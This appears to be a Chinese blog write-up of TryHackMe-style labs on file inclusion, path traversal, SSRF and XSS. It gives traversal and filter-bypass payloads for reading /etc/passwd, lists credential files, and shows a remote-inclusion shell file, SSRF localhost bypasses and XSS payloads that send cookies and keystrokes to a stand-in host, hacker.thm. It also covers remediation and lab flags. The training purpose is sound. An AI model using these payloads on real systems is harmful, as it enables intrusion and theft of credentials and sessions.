+<p>我们讨论一下，当一个用户从web服务器来请求文件访问的情况。首先，用户向包含需要展示的文件的服务器发送一个<code>HTTP</code>请求。比如，如果一个用户想要通过服务器访问他们的<code>CV</code>，他们可以发送一个类似于<code>http://webapp.thm/get.php?file=userCV.pdf</code>的请求，其中<code>file</code>这个参数的值<code>userCv.pdf</code>就是用户需要访问的文件。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9eb1eec.png" alt="image-20240412183148837.png"></p>
+<h3 id="Why-do-File-inclusion-vulnerabilities-happen"><a href="#Why-do-File-inclusion-vulnerabilities-happen" class="headerlink" title="Why do File inclusion vulnerabilities happen?"></a>Why do File inclusion vulnerabilities happen?</h3>
+<p>文件包含漏洞通常在各种编程语言中被发现和利用，用于 Web 应用程序（例如编写和实现不佳的 PHP）。这些漏洞的主要问题是输入验证，其中用户输入未经过清理或验证，由用户控制。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。</p>
+<h3 id="What-is-the-risk-of-File-inclusion"><a href="#What-is-the-risk-of-File-inclusion" class="headerlink" title="What is the risk of File inclusion?"></a>What is the risk of File inclusion?</h3>
+<p>默认情况下，攻击者可以利用文件包含漏洞泄露数据，例如代码、凭据或与 Web 应用程序或操作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则可以同时使用文件包含来获得远程命令执行 （RCE）。</p>
+<h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title="Path Traversal"></a>Path Traversal</h2>
+<p>路径遍历也称为目录遍历，web安全漏洞允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用web应用程序的URL来定位和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。</p>
+<p>当用户的输入被传递给PHP中的file_get_contents等函数时，就会出现路径遍历漏洞。需要注意的是，函数并不是导致漏洞的主要因素。通常，输入验证或过滤不力是导致该漏洞的原因。在PHP中，您可以使用file_get_contents来读取文件的内容。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f9c24294.png" alt="image-20240412211818377.png"></p>
+<p>常见敏感文件：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Location</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/etc/issue</td>
+<td>contains a message or system identification to be printed before the login prompt.</td>
+</tr>
+<tr>
+<td>/etc/profile</td>
+<td>controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
+</tr>
+<tr>
+<td>/proc/version</td>
+<td>specifies the version of the Linux kernel</td>
+</tr>
+<tr>
+<td>/etc/passwd</td>
+<td>has all registered user that has access to a system</td>
+</tr>
+<tr>
+<td>/etc/shadow</td>
+<td>contains information about the system's users' passwords</td>
+</tr>
+<tr>
+<td>/root/.bash_history</td>
+<td>contains the history commands for root user</td>
+</tr>
+<tr>
+<td>/var/log/dmessage</td>
+<td>contains global system messages, including the messages that are logged during system startup</td>
+</tr>
+<tr>
+<td>/var/mail/root</td>
+<td>all emails for root user</td>
+</tr>
+<tr>
+<td>/root/.ssh/id_rsa</td>
+<td>Private SSH keys for a root or any known valid user on the server</td>
+</tr>
+<tr>
+<td>/var/log/apache2/access.log</td>
+<td>the accessed requests for Apache webserver</td>
+</tr>
+<tr>
+<td>C:\boot.ini</td>
+<td>contains the boot options for computers with BIOS firmware</td>
+</tr>
+</tbody>
+</table>
+<h2 id="Local-File-Inclusion-LFI"><a href="#Local-File-Inclusion-LFI" class="headerlink" title="Local File Inclusion - LFI"></a>Local File Inclusion - LFI</h2>
+<p>本地文件包含漏洞的产生，主要是由于开发者缺少安全意识。对于<code>PHP</code>语言<code>include</code>,<code>require</code>,<code>include_once</code>,<code>require_once</code>经常会造成本地文件包含漏洞。</p>
+<p>假设现在有一个web应用提供了两种语言，并且用户可以在<code>EN</code>和<code>AR</code>之间切换。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;lang&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面的<code>PHP</code>代码通过URL参数<code>lang</code>使用<code>GET</code>请求来包含页面的文件。可以通过发送以下HTTP请求来完成调用，如下所示：<code>http://webapp.thm/index.php?lang=EN.php</code>加载英文页或<code>http://webapp.thm/index.php?lang=AR.php</code>要加载阿拉伯语页面，其中<code>EN.php</code>和<code>AR.php</code>文件位于同一目录中。</p>
+<p>理论上说，如果上边的代码没有任何的过滤，那么我们通过这个代码访问和展示服务器上的任何可读文件。</p>
+<p>我们可以尝试<code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
+<p>在这种情况下，因为<code>include</code>没有任何指定目录，而且没有任何输入的校验，我们可以通过这种方式读取到<code>/etc/passwd</code>。</p>
+<p>将这个代码升级一下。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;languages/&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上面的代码中，开发人员决定使用<code>include</code>函数仅通过<code>lang</code>参数调用<code>languages</code>目录中的<code>PHP</code>页面。
+如果没有输入验证，攻击者可以通过将<code>lang</code>输入替换为其他操作系统敏感文件（如<code>/etc/passwd</code>）来操纵URL。
+同样，有效负载看起来类似于路径遍历，但<code>include</code>函数允许我们将任何调用的文件包含到当前页面中。以下将是该漏洞：
+<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f99b23bb.png" alt="image-20240412214253235.png"></p>
+<p>payload:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f85144f2.png" alt="image-20240412214344148.png"></p>
+<p>先随便输入一串内容，观察报错<code>include(includes/123)</code></p>
+<p>这里暗示，我们现在在一个指定目录<code>includes</code>里边，那么我们需要借助目录遍历的方法，读取<code>/etc/passwd</code>。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f951ff52.png" alt="image-20240412214515106.png"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="Local-File-Inclusion-LFI-2"><a href="#Local-File-Inclusion-LFI-2" class="headerlink" title="Local File Inclusion - LFI #2"></a>Local File Inclusion - LFI #2</h2>
+<p>这里我们学习几种bypass`的方法</p>
+<h3 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h3>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8437715.png" alt="image-20240412214742979.png"></p>
+<p>首先第一个，输入<code>123</code>，发现报错为<code>inclued(includes/123.php)</code>，我们猜测这里后台自动为我们的输入添加了<code>php</code>的后缀，第二个关键信息为我们现在正在<code>/var/www/html/lab3.php</code>这个目录内。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8d84495.png" alt="image-20240412215424870.png"></p>
+<p>这里我们可以用<code>%00</code>截断后缀(BP发包即可)。</p>
+<p><code>%00</code>截断在<code>PHP 5.3.4</code>以上被修复</p>
+<h3 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h3>
+<p>这里过滤了<code>/etc/passwd</code>这个敏感文件，首先我们可以用类似上题的<code>%00</code>截断进行绕过。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f874ccd6.png" alt="image-20240412220107357.png"></p>
+<p>第二种方法是我们可以用<code>../../../../etc/passwd/.</code>这种形式绕过。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f860f843.png" alt="image-20240412220157357.png"></p>
+<p>这里借助<code>cd ..</code>解释下这个<code>poc</code></p>
+<p>如果我们输入命令<code>cd ..</code>那么我们会回退到上一个文件夹，但是如果我们输入命令<code>cd .</code>那么我们还是停留在当前这个文件夹。同样的，如果我们尝试<code>/etc/passwd/..</code>那么我么将会打开<code>/etc/</code>文件夹，但是我们如果尝试<code>/etc/passwd/.</code>那么我们还是会在<code>/ect/passwd</code>这里。</p>
+<h3 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h3>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8345beb.png" alt="image-20240412221146157.png"></p>
+<p>发现这里过滤了<code>../</code>这个关键字，我们可以双写绕过。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f82478f8.png" alt="image-20240412223946626.png"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..././..././..././..././etc/passwd</span><br></pre></td></tr></table></figure>
+<h3 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h3>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f803d874.png" alt="image-20240412224614232.png"></p>
+<p>这里发现过滤，只能读取<code>THM-profile</code>内的文件，也就是我们的<code>poc</code>当中必须包含<code>THM-profile</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f8179508.png" alt="image-20240412225510582.png"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">THM-profile../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion - RFI"></a>Remote File Inclusion - RFI</h2>
+<p>远程文件包含 （RFI） 是一种将远程文件包含在易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，允许攻击者将外部 <code>URL</code> 注入 <code>include</code> 函数。<code>RFI</code> 的一个要求是需要打开<code>allow_url_fopen</code>选项。</p>
+<p>RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：</p>
+<ul>
+<li>敏感信息泄露</li>
+<li>XSS</li>
+<li>DOS</li>
+</ul>
+<p>外部服务器必须与应用程序服务器通信才能成功进行 <code>RFI</code> 攻击，攻击者在其服务器上托管恶意文件。然后通过<code>HTTP</code>请求将恶意文件注入<code>include</code>函数，恶意文件的内容在易受攻击的应用服务器上执行。</p>
+<p>下图是成功进行 <code>RFI</code> 攻击的步骤示例！假设攻击者在自己的服务器上托管了一个 <code>PHP</code> 文件 <code>http://attacker.thm/cmd.txt</code> <code>cmd.txt</code>其中包含打印消息 <code>Hello THM</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">&quot;Hello THM&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先，攻击者注入恶意<code>URL</code>，该 <code>URL</code> 指向攻击者的服务器，例如 <code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。如果没有输入验证，则恶意 <code>URL</code>将传递到 <code>include</code> 函数中。接下来，Web 应用服务器将向恶意服务器发送 <code>GET</code> 请求以获取文件。因此，Web 应用程序将远程文件包含在 <code>include</code> 函数中，以在页面内执行 <code>PHP</code> 文件并将执行内容发送给攻击者。在我们的例子中，当前页面某处必须显示 <code>Hello THM</code> 消息。</p>
+<h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2>
+<ol>
+<li>使用最新版本更新系统和服务，包括 Web 应用程序框架。</li>
+<li>关闭 PHP 错误以避免泄露应用程序的路径和其他可能泄露的信息。</li>
+<li>Web 应用程序防火墙 （WAF） 是帮助缓解 Web 应用程序攻击的不错选择。</li>
+<li>如果您的 Web 应用不需要某些会导致文件包含漏洞的 <code>PHP</code> 功能，请禁用它们，例如打开<code>allow_url_fopen</code>和<code>allow_url_include</code>。</li>
+<li>仔细分析 Web 应用程序，只允许有需要的协议和 PHP 包装器。</li>
+<li>永远不要相信用户输入，并确保针对文件包含实现适当的输入验证。</li>
+<li>对文件名和位置实施白名单以及黑名单。</li>
+</ol>
+<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2>
+<h3 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h3>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f7f33642.png" alt="image-20240413122329454.png"></p>
+<p>提示需要用<code>POST</code>发包。</p>
+<p>pyload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=../../../../etc/flag1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6f7e93605.png" alt="image-20240413122433204.png"></p>
+<h3 id="change2"><a href="#change2" class="headerlink" title="change2"></a>change2</h3>
+<p>这里的文件包含漏洞发生在<code>cookie</code>里边，并且需要<code>%00</code>截断。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie:../../../../etc/flag2%00</span><br></pre></td></tr></table></figure>
+<h3 id="change3"><a href="#change3" class="headerlink" title="change3"></a>change3</h3>
+<p>这里是<code>POST</code>发包并且<code>%00</code>截断</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd1ce404.png" alt="image-20240413124036166.png"></p>
+<h3 id="change4"><a href="#change4" class="headerlink" title="change4"></a>change4</h3>
+<p>这是一个远程文件包含的测试。</p>
+<p>首先我们在本地攻击机生成一个<code>shell.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;hostname&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们在本地开启<code>http</code>服务</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fca3a602.png" alt="image-20240413124859217.png"></p>
+<p>远程文件包含</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.13.55.152:8000/shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fcb9d14b.png" alt="image-20240413124938502.png"></p>
+<h1 id="Intro-to-SSRF"><a href="#Intro-to-SSRF" class="headerlink" title="Intro to SSRF"></a>Intro to SSRF</h1>
+<h2 id="What-is-an-SSRF"><a href="#What-is-an-SSRF" class="headerlink" title="What is an SSRF?"></a>What is an SSRF?</h2>
+<h3><strong>What is an SSRF?</strong></h3>
+<p>SSRF 代表 服务器端请求伪造。这是一个漏洞，允许恶意用户导致 Web 服务器对攻击者选择的资源发出额外或编辑的 HTTP 请求。</p>
+<h3><strong>Types of SSRF</strong></h3>
+<p>SSRF 漏洞有两种类型;第一种是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是 <code>Blind SSRF</code> 漏洞，其中发生了 SSRF，但没有将任何信息返回到攻击者的屏幕。</p>
+<h3><strong>What's the impact?</strong></h3>
+<ul>
+<li>进入未经授权的区域。</li>
+<li>访问客户/组织数据。</li>
+<li>能够扩展到内部网络。</li>
+<li>显示身份验证令牌/凭据。</li>
+</ul>
+<h2 id="Finding-an-SSRF"><a href="#Finding-an-SSRF" class="headerlink" title="Finding an SSRF"></a>Finding an SSRF</h2>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd5a9718.png" alt="image-20240413130528203.png"></p>
+<h2 id="Defeating-Common-SSRF-Defenses"><a href="#Defeating-Common-SSRF-Defenses" class="headerlink" title="Defeating Common SSRF Defenses"></a>Defeating Common SSRF Defenses</h2>
+<p>更精通安全的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表(黑名单)或允许列表(白名单)。</p>
+<h3><strong>Deny List</strong></h3>
+<p>Web 应用程序可以使用拒绝列表来保护敏感的端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 <code>localhost</code>，它可能包含服务器性能数据或其他敏感信息，因此 <code>localhost</code> 和 <code>127.0.0.1</code> 等域名将出现在黑名单当中。</p>
+<p>攻击者可以使用替代的 localhost 引用。例如，<code>0</code>,<code>0.0.0.0</code>,<code>0000</code>,<code>127.1</code>,<code>123.*.*.*</code>,<code>2130706433</code>,<code>017700000001</code>或者具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 <a target="_blank" rel="noopener" href="http://127.0.0.1.nip.io">127.0.0.1.nip.io</a>。</p>
+<h3 id="Allow-List"><a href="#Allow-List" class="headerlink" title="Allow List"></a>Allow List</h3>
+<p>例如参数中使用的 URL 必须以 <code>https://website.thm</code>开头的规则。攻击者可以通过在攻击者的域名上创建子域（如 <code>https://website.thm.attackers-domain.thm</code>）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。</p>
+<h3><strong>Open Redirect</strong></h3>
+<p>开放重定向是服务器上的一个端点，网站访问者在其中自动重定向到另一个网站地址。以链接<code>https://website.thm/link?url=https://tryhackme.com</code> 为例。创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，该漏洞具有严格的规则，仅允许以<code>https://website.thm/</code> 开头的 URL。攻击者可利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。</p>
+<h2 id="SSRF-Practical"><a href="#SSRF-Practical" class="headerlink" title="SSRF Practical"></a>SSRF Practical</h2>
+<p>这里告诉我们存在一个<code>/private</code>目录，但是我们无法直接访问。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc8b34aa.png" alt="image-20240413133556965.png"></p>
+<p>尝试各种方法无法绕过，这里一般情况都要考虑<code>SSRF</code>。</p>
+<p>这里提示我们访问<code>/customers/new-account-page</code>这个目录。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd071d9c.png" alt="image-20240413133731384.png"></p>
+<p>我们可以在这里为自己选择头像。</p>
+<p>我们随便选择一个头像，跟踪一下前端代码。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc774c78.png" alt="image-20240413133831648.png"></p>
+<p>猜测这里通过<code>url</code>访问了后台的图片资源，我们切换成这个头像看一下。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fcf30cc4.png" alt="image-20240413133913537.png"></p>
+<p>现在我们的头像已经变成我们选定的那个，这里再次跟踪下前端代码。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd4d8ee7.png" alt="image-20240413133950501.png"></p>
+<p>发现这里接受了这个图像的<code>base64</code>编码。</p>
+<p>这里我们考虑将请求的<code>url</code>替换成<code>/private</code>，进而访问这个网页的内容。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc619a96.png" alt="image-20240413134059566.png"></p>
+<p>这里修改前端代码后，选择这个头像。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc56626e.png" alt="image-20240413134129376.png"></p>
+<p>但是这里发现被过滤了。</p>
+<p>我们修改<code>poc</code>为<code>x/../private</code></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc18f120.png" alt="image-20240413134304302.png"></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbca936f.png" alt="image-20240413134321528.png"></p>
+<p>更改之后，发现我们的头像这个地方一片空白，我们跟踪下这个图片的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64,VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==</span><br><span class="line">THM&#123;YOU_WORKED_OUT_THE_SSRF&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Intro-to-Cross-site-Scripting"><a href="#Intro-to-Cross-site-Scripting" class="headerlink" title="Intro to Cross-site Scripting"></a>Intro to Cross-site Scripting</h1>
+<p>跨站点脚本，在网络安全社区中更广为人知的是 <code>XSS</code>，被归类为一种注入攻击，其中恶意 <code>JavaScript</code> 被注入到 <code>Web</code> 应用程序中，目的是由其他用户执行。</p>
+<h2 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h2>
+<h3><strong>Proof Of Concept:</strong></h3>
+<p>这是最简单的有效载荷，您只想证明您可以在网站上实现XSS。这通常是通过在页面上弹出一个带有字符串文本的警告框来实现的，例如</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3><strong>Session Stealing:</strong></h3>
+<p>用户会话的详细信息，如登录令牌，通常保存在目标机器上的cookie中。下面的JavaScript获取目标的cookie，base64对cookie进行编码以确保成功传输，然后将其发布到黑客控制下的网站上进行记录。一旦黑客拥有这些cookie，他们就可以接管目标的会话并作为该用户登录。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3><strong>Key Logger:</strong></h3>
+<p>以下代码充当钥匙记录器。这意味着你在网页上键入的任何内容都将被转发到黑客控制下的网站。如果网站的有效负载安装在接受的用户登录或信用卡详细信息上，这可能会造成非常大的破坏。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="title function_">fetch</span>(<span class="string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3><strong>Business Logic:</strong></h3>
+<p>这个有效载荷比上面的例子要具体得多。这将是关于调用特定的网络资源或JavaScript函数。例如，想象一个用于更改用户电子邮件地址的JavaScript函数<code>user.changeEmail()</code>。您的有效载荷可能如下所示：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">user.<span class="title function_">changeEmail</span>(<span class="string">&#x27;attacker@hacker.thm&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现在帐户的电子邮件地址已经更改，攻击者可能会执行重置密码攻击。</p>
+<h2 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h2>
+<p>一个网站，如果您输入了错误的输入，就会显示一条错误消息。错误消息的内容取自查询字符串中的错误参数，并直接构建到页面源中。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fbc05fc2.png" alt="image-20240413140327579.png"></p>
+<p>应用程序不检查错误参数的内容，这允许攻击者插入恶意代码。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fc70b311.png" alt="image-20240413140402409.png"></p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd2efedc.png" alt="image-20240413140419264.png"></p>
+<h3><strong>Potential Impact</strong></h3>
+<p>攻击者可以向潜在的受害者发送链接或将其嵌入到另一个网站上的iframe中，该网站包含JavaScript负载，让他们在浏览器上执行代码，从而可能泄露会话或客户信息。</p>
+<h3><strong>How to test for Reflected XSS</strong></h3>
+<ul>
+<li>URL查询字符串中的参数</li>
+<li>URL文件路径</li>
+<li>有时HTTP标头（尽管在实践中不太可能被利用）</li>
+</ul>
+<h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2>
+<p>假设这样一个场景，有允许用户发表评论的博客网站。不幸的是，这些评论没有被检查是否包含<code>JavaScript</code>或过滤掉任何恶意代码。如果我们现在发布一条包含<code>JavaScript</code>的评论，它将被存储在数据库中，并且现在访问文章的每个其他用户都将在他们的浏览器中运行<code>JavaScript</code>。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fd3ce402.png" alt="image-20240413143450272.png"></p>
+<h3><strong>Potential Impact:</strong></h3>
+<p>恶意<code>JavaScript</code>可以将用户重定向到另一个网站，窃取用户的会话<code>cookie</code>，或在作为访问用户时执行其他网站操作。</p>
+<h3><strong>How to test for Stored XSS:</strong></h3>
+<p>经常存在漏洞的位置：</p>
+<ul>
+<li>博客上的评论</li>
+<li>用户配置文件信息</li>
+<li>网站列表</li>
+</ul>
+<p>有时，开发人员认为限制客户端上的输入值就足够了，因此将值更改为web应用程序所不期望的值是发现存储的<code>XSS</code>的一个很好的来源，例如，一个期望下拉菜单中的整数的年龄字段，但相反，您可以手动发送请求，而不是使用允许您尝试恶意有效负载的表单</p>
+<h2 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h2>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">参考文章</a></p>
+<h3><strong>What is the DOM?</strong></h3>
+<p><code>DOM</code>代表文档对象模型，是<code>HTML</code>和<code>XML</code>文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档可以显示在浏览器窗口中，也可以作为<code>HTML</code>源显示。下面显示了<code>HTML DOM</code>的图表。</p>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb6735dc.png" alt="image-20240413144223907.png"></p>
+<h3><strong>Exploiting the DOM</strong></h3>
+<p>基于<code>DOM</code>的<code>XSS</code>是<code>JavaScript</code>直接在浏览器中执行的地方，而无需加载任何新页面或将数据提交给后端代码。当网站<code>JavaScript</code>代码作用于输入或用户交互时，就会执行。</p>
+<h3><strong>Example Scenario</strong></h3>
+<p>网站的<code>JavaScript</code>从<code>window.location.hash</code>参数中获取内容，然后将其写入当前查看部分的页面。哈希的内容不会被检查是否有恶意代码，攻击者可以将自己选择的<code>JavaScript</code>注入网页。</p>
+<h3><strong>How to test for Dom Based XSS:</strong></h3>
+<p>基于<code>DOM</code>的<code>XSS</code>可能很难测试，并且需要一定的<code>JavaScript</code>知识才能阅读源代码。您需要查找访问攻击者可以控制的某些变量的代码部分，例如<code>“window.location.x”</code>参数。</p>
+<p>当你找到这些代码后，你需要看看它们是如何处理的，以及这些值是否被写入网页的<code>DOM</code>或传递给不安全的<code>JavaScript</code>方法，如<code>eval()</code>。</p>
+<h2 id="Blind-XSS"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h2>
+<p><code>Blind XSS</code>类似于存储的<code>XSS</code>，因为您的有效负载存储在网站上供其他用户查看，但在这种情况下，您无法看到有效负载工作，也无法首先对自己进行测试。</p>
+<h3><strong>Example Scenario:</strong></h3>
+<p>一个网站有一个联系表格，你可以在那里给员工发信息。消息内容不会被检查是否有任何恶意代码，这使得攻击者可以输入他们想要的任何内容。然后，这些消息会变成支持票，工作人员可以在私人门户网站上查看。</p>
+<h3><strong>Potential Impact:</strong></h3>
+<p>使用正确的有效负载，攻击者的<code>JavaScript</code>可以回调攻击者的网站，从而显示员工门户网站的<code>URL</code>、员工的<code>cookie</code>，甚至是正在查看的门户网站页面的内容。现在，攻击者可能会劫持该工作人员的会话，并可以访问私人门户网站。</p>
+<h3><strong>How to test for Blind XSS:</strong></h3>
+<p>在测试Blind XSS漏洞时，您需要确保您的负载具有回调（通常是HTTP请求）。通过这种方式，您可以知道代码是否以及何时被执行。</p>
+<h2 id="Perfecting-your-payload"><a href="#Perfecting-your-payload" class="headerlink" title="Perfecting your payload"></a>Perfecting your payload</h2>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;THM&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3>
+<p>这里需要<code>"&gt;</code>来闭合一下前边<code>input</code>标签，然后插入我们的恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;THM&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3>
+<p>这里用<code>&lt;/textarea&gt;</code>标签闭合一下，然后插入恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&#x27;THM&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3>
+<p><img src="https://img.xwyue.com/i/2024/04/14/661b6fb52f0a0.png" alt="image-20240413151104465.png"></p>
+<p>这里随便测试一下，发现我们输入的内容被写入到了这个地方。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;alert(&#x27;THM&#x27;);//</span><br></pre></td></tr></table></figure>
